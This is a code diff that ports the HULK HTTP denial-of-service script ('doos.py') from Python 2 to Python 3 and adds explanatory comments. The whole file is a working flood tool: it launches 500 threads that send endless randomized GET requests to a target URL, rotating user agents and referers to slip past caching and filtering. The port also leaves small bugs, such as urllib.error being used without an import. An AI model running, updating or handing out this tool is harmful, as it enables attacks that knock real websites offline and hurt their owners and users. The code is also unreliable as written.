@@ -1,10 +1,10 @@
-import urllib.request as urllib2  # تغییر از urllib2 به urllib.request
+import urllib.request
 import sys
 import threading
 import random
 import re
 
-#global params
+# global params
 url = ''
 host = ''
 headers_useragents = []
@@ -25,6 +25,7 @@ def set_safe():
     global safe
     safe = 1
 
+# generates a user agent array
 def useragent_list():
     global headers_useragents
     headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
@@ -41,6 +42,7 @@ def useragent_list():
     headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
     return headers_useragents
 
+# generates a referer array
 def referer_list():
     global headers_referers
     headers_referers.append('http://www.google.com/?q=')
@@ -49,6 +51,7 @@ def referer_list():
     headers_referers.append('http://' + host + '/')
     return headers_referers
 
+# builds random ascii string
 def buildblock(size):
     out_str = ''
     for i in range(0, size):
@@ -58,10 +61,11 @@ def buildblock(size):
 
 def usage():
     print('---------------------------------------------------')
-    print('USAGE: python doos.py <url>')
-    print('you can add "safe" after url, to autoshut after dos')
+    print('USAGE: python3 doos.py <url>')
+    print('you can add "safe" after url, to auto shut after dos')
     print('---------------------------------------------------')
 
+# http request
 def httpcall(url):
     useragent_list()
     referer_list()
@@ -70,7 +74,7 @@ def httpcall(url):
         param_joiner = "&"
     else:
         param_joiner = "?"
-    request = urllib2.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
+    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
     request.add_header('User-Agent', random.choice(headers_useragents))
     request.add_header('Cache-Control', 'no-cache')
     request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
@@ -78,21 +82,21 @@ def httpcall(url):
     request.add_header('Keep-Alive', random.randint(110, 120))
     request.add_header('Connection', 'keep-alive')
     request.add_header('Host', host)
-    
+
     try:
-        urllib2.urlopen(request)
-    except urllib2.HTTPError as e:
+        urllib.request.urlopen(request)
+    except urllib.error.HTTPError as e:
         set_flag(1)
         print('Response Code 500')
         code = 500
-    except urllib2.URLError as e:
+    except urllib.error.URLError as e:
         sys.exit()
     else:
         inc_counter()
-        urllib2.urlopen(request)
-    
+        urllib.request.urlopen(request)
     return code
 
+# http caller thread
 class HTTPThread(threading.Thread):
     def run(self):
         try:
@@ -103,6 +107,7 @@ class HTTPThread(threading.Thread):
         except Exception as ex:
             pass
 
+# monitors http threads and counts requests
 class MonitorThread(threading.Thread):
     def run(self):
         previous = request_counter
@@ -113,6 +118,7 @@ class MonitorThread(threading.Thread):
         if flag == 2:
             print("\n-- HULK Attack Finished --")
 
+# execute
 if len(sys.argv) < 2:
     usage()
     sys.exit()
@@ -128,7 +134,7 @@ else:
         url = sys.argv[1]
         if url.count("/") == 2:
             url = url + "/"
-        m = re.search('(https?://)?([^/]*)/?.*', url)
+        m = re.search('(https?\://)?([^/]*)/?.*', url)
         host = m.group(2)
         for i in range(500):
             t = HTTPThread()
